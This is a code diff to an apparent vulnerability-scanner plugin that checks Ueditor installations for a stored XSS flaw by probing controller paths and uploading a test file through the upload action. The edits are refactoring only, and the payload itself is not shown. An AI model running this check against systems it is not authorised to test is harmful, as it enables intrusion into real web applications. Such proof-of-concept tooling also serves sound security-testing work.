@@ -1,12 +1,12 @@
 import urllib.parse
 
 from xing.core.BasePlugin import BasePlugin
-from xing.utils import http_req, get_logger
+from xing.utils import http_req
 from xing.core import PluginType, SchemeType
 
 class Plugin(BasePlugin):
     def __init__(self):
-        super(Plugin, self).__init__()
+        super().__init__()
         self.plugin_type = PluginType.POC
         self.vul_name = "Ueditor 存储 XSS 漏洞"
         self.app_name = 'Ueditor'
@@ -15,7 +15,6 @@ class Plugin(BasePlugin):
 
     def verify(self, target):
         payload = "?action=uploadfile"
-        check = b"\\u94fe\\u63a5\\u4e0d\\u53ef\\u7528"
         paths = ["/ueditor/php/controller.php", "/Public/ueditor/php/controller.php"]
         paths.extend(["/js/ueditor/php/controller.php"])
         paths.extend(["/statics/ueditor/php/controller.php"])
@@ -23,21 +22,21 @@ class Plugin(BasePlugin):
         paths.extend(["/ueditor/jsp/controller.jsp"])
 
         check_paths = [b'{"state":"\\u8bf7\\u6c42\\u5730\\u5740\\u51fa\\u9519"}']
-        check_paths.extend([b'{"state": "\u65e0\u6548\u7684Action"}'])
+        check_paths.extend([br'{"state": "\u65e0\u6548\u7684Action"}'])
         check_paths.extend([b'upload method not exists'])
 
-        self.logger.info("verify {}".format(target))
+        self.logger.info(f"verify {target}")
 
         for path in paths:
             url = target + path
             conn = http_req(url)
             for check_path in check_paths:
                 if check_path in conn.content and b"<" not in conn.content:
-                    self.logger.info("found ueditor controller {}".format(url))
+                    self.logger.info(f"found ueditor controller {url}")
                     upload_url = url + payload
                     poc_url = self._upload_xss(upload_url)
                     if  poc_url:
-                        self.logger.success("found vul {}".format(poc_url))
+                        self.logger.success(f"found vul {poc_url}")
                         return poc_url
                     return
 
@@ -55,7 +54,7 @@ class Plugin(BasePlugin):
 
         conn_poc = http_req(url, method='post', files=files)
         if b'"SUCCESS"' in conn_poc.content:
-            self.logger.info("upload success {}".format(url))
+            self.logger.info(f"upload success {url}")
             ret = conn_poc.json()
             poc_url = ret.get("url", "")
             if ".xml" in poc_url:
